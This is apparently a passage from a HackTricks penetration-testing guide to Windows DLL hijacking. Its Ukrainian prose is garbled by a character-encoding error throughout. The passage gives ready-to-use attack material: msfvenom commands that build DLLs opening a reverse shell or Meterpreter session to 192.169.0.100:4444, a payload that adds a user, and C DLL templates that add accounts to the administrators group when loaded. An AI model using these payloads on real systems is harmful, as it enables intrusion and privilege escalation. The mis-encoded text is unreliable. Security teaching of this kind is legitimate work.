* –í–∏–∑–Ω–∞—á—Ç–µ –ø—Ä–æ—Ü–µ—Å, —è–∫–∏–π –ø—Ä–∞—Ü—é—î –∞–±–æ –±—É–¥–µ –ø—Ä–∞—Ü—é–≤–∞—Ç–∏ –ø—ñ–¥ **—Ä—ñ–∑–Ω–∏–º–∏ –ø—Ä–∏–≤—ñ–ª–µ—è–º–∏** (–≥–æ—Ä–∏–∑–æ–Ω—Ç–∞–ª—å–Ω–∏–π –∞–±–æ –±—ñ—á–Ω–∏–π —Ä—É—Ö), —è–∫–æ–º—É **–Ω–µ –≤–∏—Å—Ç–∞—á–∞—î DLL**.
* –ü–µ—Ä–µ–∫–æ–Ω–∞–π—Ç–µ—Å—è, —â–æ —î **–ø—Ä–∞–≤–∞ –Ω–∞ –∑–∞–ø–∏—Å** –¥–ª—è –±—É–¥—å-—è–∫–æ–≥–æ **–∫–∞—Ç–∞–ª–æ–≥—É**, –≤ —è–∫–æ–º—É –±—É–¥–µ **—à—É–∫–∞—Ç–∏—Å—è DLL**. –¶–µ –º–æ–∂–µ –±—É—Ç–∏ –∫–∞—Ç–∞–ª–æ–≥ –≤–∏–∫–æ–Ω–∞–≤—á–æ–≥–æ —Ñ–∞–π–ª—É –∞–±–æ –∫–∞—Ç–∞–ª–æ–≥ —É —Å–∏—Å—Ç–µ–º–Ω–æ–º—É —à–ª—è—Ö—É.

–¢–∞–∫, –≤–∏–º–æ–≥–∏ —Å–∫–ª–∞–¥–Ω–æ –∑–Ω–∞–π—Ç–∏, –æ—Å–∫—ñ–ª—å–∫–∏ **–∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º –¥–æ—Å–∏—Ç—å –¥–∏–≤–Ω–æ –∑–Ω–∞–π—Ç–∏ –ø—Ä–∏–≤—ñ–ª–µ–π–æ–≤–∞–Ω–∏–π –≤–∏–∫–æ–Ω–∞–≤—á–∏–π —Ñ–∞–π–ª, —É —è–∫–æ–≥–æ –≤—ñ–¥—Å—É—Ç–Ω—è DLL**, —ñ —â–µ **–¥–∏–≤–Ω—ñ—à–µ –º–∞—Ç–∏ –ø—Ä–∞–≤–∞ –Ω–∞ –∑–∞–ø–∏—Å —É –∫–∞—Ç–∞–ª–æ–∑—ñ —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ —à–ª—è—Ö—É** (–∑–∞–∑–≤–∏—á–∞–π —Ü—å–æ–≥–æ –Ω–µ –º–æ–∂–Ω–∞ –∑—Ä–æ–±–∏—Ç–∏). –ê–ª–µ –≤ –Ω–µ–ø—Ä–∞–≤–∏–ª—å–Ω–æ –Ω–∞–ª–∞—à—Ç–æ–≤–∞–Ω–∏—Ö —Å–µ—Ä–µ–¥–æ–≤–∏—â–∞—Ö —Ü–µ –º–æ–∂–ª–∏–≤–æ.\
–£ –≤–∏–ø–∞–¥–∫—É, —è–∫—â–æ –≤–∏ —â–∞—Å–ª–∏–≤—á–∏–∫ —ñ –≤—ñ–¥–ø–æ–≤—ñ–¥–∞—î—Ç–µ –≤–∏–º–æ–≥–∞–º, –≤–∏ –º–æ–∂–µ—Ç–µ –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏ –ø—Ä–æ–µ–∫—Ç [UACME](https://github.com/hfiref0x/UACME). –ù–∞–≤—ñ—Ç—å —è–∫—â–æ **–æ—Å–Ω–æ–≤–Ω–∞ –º–µ—Ç–∞ –ø—Ä–æ–µ–∫—Ç—É - –æ–±—Ö—ñ–¥ UAC**, –≤–∏ —Ç–∞–º –º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ **PoC** –¥–ª—è –ø–µ—Ä–µ—Ö–æ–ø–ª–µ–Ω–Ω—è DLL –¥–ª—è –≤–µ—Ä—Å—ñ—ó Windows, —è–∫—É –≤–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ (—ñ–º–æ–≤—ñ—Ä–Ω–æ, –ø—Ä–æ—Å—Ç–æ –∑–º—ñ–Ω–∏–≤—à–∏ —à–ª—è—Ö –∫–∞—Ç–∞–ª–æ–≥—É, –¥–µ —É –≤–∞—Å —î –ø—Ä–∞–≤–∞ –Ω–∞ –∑–∞–ø–∏—Å).

–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ –≤–∏ –º–æ–∂–µ—Ç–µ **–ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏ —Å–≤–æ—ó –¥–æ–∑–≤–æ–ª–∏ –≤ –∫–∞—Ç–∞–ª–æ–∑—ñ**, –≤–∏–∫–æ–Ω–∞–≤—à–∏:

```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```

–Ü **–ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ –¥–æ–∑–≤–æ–ª–∏ –Ω–∞ –≤—Å—ñ –ø–∞–ø–∫–∏ –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –®–õ–Ø–•–£**:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

–í–∏ —Ç–∞–∫–æ–∂ –º–æ–∂–µ—Ç–µ –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏ —ñ–º–ø–æ—Ä—Ç–∏ –≤–∏–∫–æ–Ω—É–≤–∞–Ω–æ–≥–æ —Ñ–∞–π–ª—É —Ç–∞ –µ–∫—Å–ø–æ—Ä—Ç–∏ dll –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é:

```c
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```

–î–ª—è –ø–æ–≤–Ω–æ–≥–æ –ø–æ—Å—ñ–±–Ω–∏–∫–∞ –∑ **–∑–ª–æ–≤–∂–∏–≤–∞–Ω–Ω—è Dll Hijacking –¥–ª—è –ø—ñ–¥–≤–∏—â–µ–Ω–Ω—è –ø—Ä–∏–≤—ñ–ª–µ—ó–≤** –∑ –¥–æ–∑–≤–æ–ª–æ–º –Ω–∞ –∑–∞–ø–∏—Å —É –ø–∞–ø—Ü—ñ **System Path** –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ:

{% content-ref url="writable-sys-path-+dll-hijacking-privesc.md" %}
[writable-sys-path-+dll-hijacking-privesc.md](writable-sys-path-+dll-hijacking-privesc.md)
{% endcontent-ref %}

### –ê–≤—Ç–æ–º–∞—Ç–∏–∑–æ–≤–∞–Ω—ñ —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∏

[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç—å, —á–∏ —î —É –≤–∞—Å –ø—Ä–∞–≤–∞ –Ω–∞ –∑–∞–ø–∏—Å —É –±—É–¥—å-—è–∫—ñ–π –ø–∞–ø—Ü—ñ –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ —à–ª—è—Ö—É.\
–Ü–Ω—à—ñ —Ü—ñ–∫–∞–≤—ñ –∞–≤—Ç–æ–º–∞—Ç–∏–∑–æ–≤–∞–Ω—ñ —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∏ –¥–ª—è –≤–∏—è–≤–ª–µ–Ω–Ω—è —Ü—ñ—î—ó –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ - —Ü–µ —Ñ—É–Ω–∫—Ü—ñ—ó **PowerSploit**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ —Ç–∞ _Write-HijackDll._

### –ü—Ä–∏–∫–ª–∞–¥

–£ –≤–∏–ø–∞–¥–∫—É –≤–∏—è–≤–ª–µ–Ω–Ω—è —Å–∏—Ç—É–∞—Ü—ñ—ó, —è–∫—É –º–æ–∂–Ω–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞—Ç–∏ –¥–ª—è –∞—Ç–∞–∫–∏, –æ–¥–Ω–∏–º –∑ –Ω–∞–π–≤–∞–∂–ª–∏–≤—ñ—à–∏—Ö –∞—Å–ø–µ–∫—Ç—ñ–≤ —É—Å–ø—ñ—à–Ω–æ—ó –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó –±—É–¥–µ **—Å—Ç–≤–æ—Ä–µ–Ω–Ω—è dll, —è–∫–∞ –µ–∫—Å–ø–æ—Ä—Ç—É—î –ø—Ä–∏–Ω–∞–π–º–Ω—ñ –≤—Å—ñ —Ñ—É–Ω–∫—Ü—ñ—ó, —è–∫—ñ –≤–∏–∫–æ–Ω—É–≤–∞–Ω–∏–π —Ñ–∞–π–ª –±—É–¥–µ —ñ–º–ø–æ—Ä—Ç—É–≤–∞—Ç–∏ –∑ –Ω–µ—ó**. –£ –±—É–¥—å-—è–∫–æ–º—É –≤–∏–ø–∞–¥–∫—É, —Å–ª—ñ–¥ –∑–∞—É–≤–∞–∂–∏—Ç–∏, —â–æ Dll Hijacking –¥–æ–ø–æ–º–∞–≥–∞—î [–ø—ñ–¥–≤–∏—â–∏—Ç–∏ —Ä—ñ–≤–µ–Ω—å —Å–µ—Ä–µ–¥–æ–≤–∏—â–∞ –≤—ñ–¥ —Å–µ—Ä–µ–¥–Ω—å–æ–≥–æ –¥–æ –≤–∏—Å–æ–∫–æ–≥–æ **(–æ–±—Ö—ñ–¥ UAC)**](../../authentication-credentials-uac-and-efs/#uac) –∞–±–æ –∑ [**–≤–∏—Å–æ–∫–æ–≥–æ —Ä—ñ–≤–Ω—è –¥–æ SYSTEM**](../#from-high-integrity-to-system)**.** –í–∏ –º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ –ø—Ä–∏–∫–ª–∞–¥ **—Å—Ç–≤–æ—Ä–µ–Ω–Ω—è –¥—ñ–π—Å–Ω–æ—ó dll** —É —Ü—å–æ–º—É –¥–æ—Å–ª—ñ–¥–∂–µ–Ω–Ω—ñ –∑–æ—Å–µ—Ä–µ–¥–∂–µ–Ω–æ–º—É –Ω–∞ Dll Hijacking –¥–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
–ë—ñ–ª—å—à–µ —Ç–æ–≥–æ, —É **–Ω–∞—Å—Ç—É–ø–Ω–æ–º—É —Ä–æ–∑–¥—ñ–ª—ñ** –≤–∏ –º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ –¥–µ—è–∫—ñ **–æ—Å–Ω–æ–≤–Ω—ñ –∫–æ–¥–∏ dll**, —è–∫—ñ –º–æ–∂—É—Ç—å –±—É—Ç–∏ –∫–æ—Ä–∏—Å–Ω–∏–º–∏ —è–∫ **—à–∞–±–ª–æ–Ω–∏** –∞–±–æ –¥–ª—è —Å—Ç–≤–æ—Ä–µ–Ω–Ω—è **dll –∑ –µ–∫—Å–ø–æ—Ä—Ç–æ–º —Ñ—É–Ω–∫—Ü—ñ–π, —è–∫—ñ –Ω–µ –ø–æ—Ç—Ä—ñ–±–Ω—ñ**.

## **–°—Ç–≤–æ—Ä–µ–Ω–Ω—è —Ç–∞ –∫–æ–º–ø—ñ–ª—è—Ü—ñ—è Dlls**

### **–ü—Ä–æ–∫—Å—ñ—Ñ—ñ–∫–∞—Ü—ñ—è Dll**

–û—Å–Ω–æ–≤–Ω–∞ —ñ–¥–µ—è **–ø—Ä–æ–∫—Å—ñ-–±—ñ–±–ª—ñ–æ—Ç–µ–∫–∏ Dll** –ø–æ–ª—è–≥–∞—î –≤ —Ç–æ–º—É, —â–æ –≤–æ–Ω–∞ –º–æ–∂–µ **–≤–∏–∫–æ–Ω—É–≤–∞—Ç–∏ –≤–∞—à —à–∫—ñ–¥–ª–∏–≤–∏–π –∫–æ–¥ –ø—Ä–∏ –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—ñ**, –∞ —Ç–∞–∫–æ–∂ **–≤–∏–∫–æ–Ω—É–≤–∞—Ç–∏** —Ç–∞ **–ø—Ä–∞—Ü—é–≤–∞—Ç–∏** —è–∫ **–≤–∏–º–∞–≥–∞—î—Ç—å—Å—è**, **–ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª—è—é—á–∏ –≤—Å—ñ –≤–∏–∫–ª–∏–∫–∏ –¥–æ —Ä–µ–∞–ª—å–Ω–æ—ó –±—ñ–±–ª—ñ–æ—Ç–µ–∫–∏**.

–ó–∞ –¥–æ–ø–æ–º–æ–≥–æ—é —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç—ñ–≤ [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) –∞–±–æ [**Spartacus**](https://github.com/Accenture/Spartacus) –≤–∏ –º–æ–∂–µ—Ç–µ **–≤–∫–∞–∑–∞—Ç–∏ –≤–∏–∫–æ–Ω–∞–≤—á–∏–π —Ñ–∞–π–ª —Ç–∞ –≤–∏–±—Ä–∞—Ç–∏ –±—ñ–±–ª—ñ–æ—Ç–µ–∫—É**, —è–∫—É –≤–∏ —Ö–æ—á–µ—Ç–µ –ø—Ä–æ–∫—Å—ñ—Ñ—ñ–∫—É–≤–∞—Ç–∏ —Ç–∞ **—Å—Ç–≤–æ—Ä–∏—Ç–∏ –ø—Ä–æ–∫—Å—ñ—Ñ—ñ–∫–æ–≤–∞–Ω—É dll** –∞–±–æ **–≤–∫–∞–∑–∞—Ç–∏ Dll** —Ç–∞ **—Å—Ç–≤–æ—Ä–∏—Ç–∏ –ø—Ä–æ–∫—Å—ñ—Ñ—ñ–∫–æ–≤–∞–Ω—É dll**.

### **Meterpreter**

**–û—Ç—Ä–∏–º–∞—Ç–∏ –æ–±–µ—Ä–Ω–µ–Ω—É –æ–±–æ–ª–æ–Ω–∫—É (x64):**

```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**–û—Ç—Ä–∏–º–∞—Ç–∏ meterpreter (x86):**

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**–°—Ç–≤–æ—Ä–µ–Ω–Ω—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ (x86 —è –Ω–µ –±–∞—á–∏–≤ –≤–µ—Ä—Å—ñ—ó x64):**

```
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```

### –í–∞—à –≤–ª–∞—Å–Ω–∏–π

–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ —É –¥–µ–∫—ñ–ª—å–∫–æ—Ö –≤–∏–ø–∞–¥–∫–∞—Ö Dll, —è–∫–∏–π –≤–∏ –∫–æ–º–ø—ñ–ª—é—î—Ç–µ, –ø–æ–≤–∏–Ω–µ–Ω **–µ–∫—Å–ø–æ—Ä—Ç—É–≤–∞—Ç–∏ –∫—ñ–ª—å–∫–∞ —Ñ—É–Ω–∫—Ü—ñ–π**, —è–∫—ñ –±—É–¥—É—Ç—å –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω—ñ –∂–µ—Ä—Ç–æ–≤–Ω–∏–º –ø—Ä–æ—Ü–µ—Å–æ–º, —è–∫—â–æ —Ü—ñ —Ñ—É–Ω–∫—Ü—ñ—ó –Ω–µ —ñ—Å–Ω—É—é—Ç—å, **–±—ñ–Ω–∞—Ä–Ω–∏–π —Ñ–∞–π–ª –Ω–µ –∑–º–æ–∂–µ —ó—Ö –∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏**, —ñ **–µ–∫—Å–ø–ª–æ–π—Ç –Ω–µ –≤–¥–∞—Å—Ç—å—Å—è**.

```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```

## –ü–æ—Å–∏–ª–∞–Ω–Ω—è

* [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
* [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)

<figure><img src="../../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**–ü—ñ–¥–∫–∞–∑–∫–∞ —â–æ–¥–æ –≤–∏–Ω–∞–≥–æ—Ä–æ–¥–∏ –∑–∞ –≤–∏—è–≤–ª–µ–Ω–Ω—è –ø–æ–º–∏–ª–æ–∫**: **–∑–∞—Ä–µ—î—Å—Ç—Ä—É–π—Ç–µ—Å—å** –Ω–∞ **Intigriti**, –ø—Ä–µ–º—ñ–∞–ª—å–Ω—ñ–π **–ø–ª–∞—Ç—Ñ–æ—Ä–º—ñ –¥–ª—è –≤–∏—è–≤–ª–µ–Ω–Ω—è –ø–æ–º–∏–ª–æ–∫, —Å—Ç–≤–æ—Ä–µ–Ω—ñ–π —Ö–∞–∫–µ—Ä–∞–º–∏ –¥–ª—è —Ö–∞–∫–µ—Ä—ñ–≤**! –ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ –Ω–∞—Å –Ω–∞ [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) —Å—å–æ–≥–æ–¥–Ω—ñ, —ñ –ø–æ—á–Ω—ñ—Ç—å –∑–∞—Ä–æ–±–ª—è—Ç–∏ –≤–∏–Ω–∞–≥–æ—Ä–æ–¥–∏ –¥–æ **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><strong>–í–∏–≤—á–∞–π—Ç–µ —Ö–∞–∫—ñ–Ω–≥ AWS –≤—ñ–¥ –Ω—É–ª—è –¥–æ –≥–µ—Ä–æ—è –∑</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

–Ü–Ω—à—ñ —Å–ø–æ—Å–æ–±–∏ –ø—ñ–¥—Ç—Ä–∏–º–∫–∏ HackTricks:

* –Ø–∫—â–æ –≤–∏ —Ö–æ—á–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏ —Å–≤–æ—é **–∫–æ–º–ø–∞–Ω—ñ—é —Ä–µ–∫–ª–∞–º–æ–≤–∞–Ω—É –≤ HackTricks** –∞–±–æ **–∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ HackTricks —É —Ñ–æ—Ä–º–∞—Ç—ñ PDF**, –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ü–õ–ê–ù–ò –ü–Ü–î–ü–ò–°–ö–ò**](https://github.com/sponsors/carlospolop)!
* –û—Ç—Ä–∏–º–∞–π—Ç–µ [**–æ—Ñ—ñ—Ü—ñ–π–Ω–∏–π –º–µ—Ä—á PEASS & HackTricks**](https://peass.creator-spring.com)
* –í—ñ–¥–∫—Ä–∏–π—Ç–µ –¥–ª—è —Å–µ–±–µ [**–°—ñ–º'—é PEASS**](https://opensea.io/collection/the-peass-family), –Ω–∞—à—É –∫–æ–ª–µ–∫—Ü—ñ—é –µ–∫—Å–∫–ª—é–∑–∏–≤–Ω–∏—Ö [**NFT**](https://opensea.io/collection/the-peass-family)
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ Telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –Ω–∞ **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **–ü–æ–¥—ñ–ª—ñ—Ç—å—Å—è —Å–≤–æ—ó–º–∏ —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞–π—Ç–µ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) **—ñ** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **—Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ GitHub**.

</details>
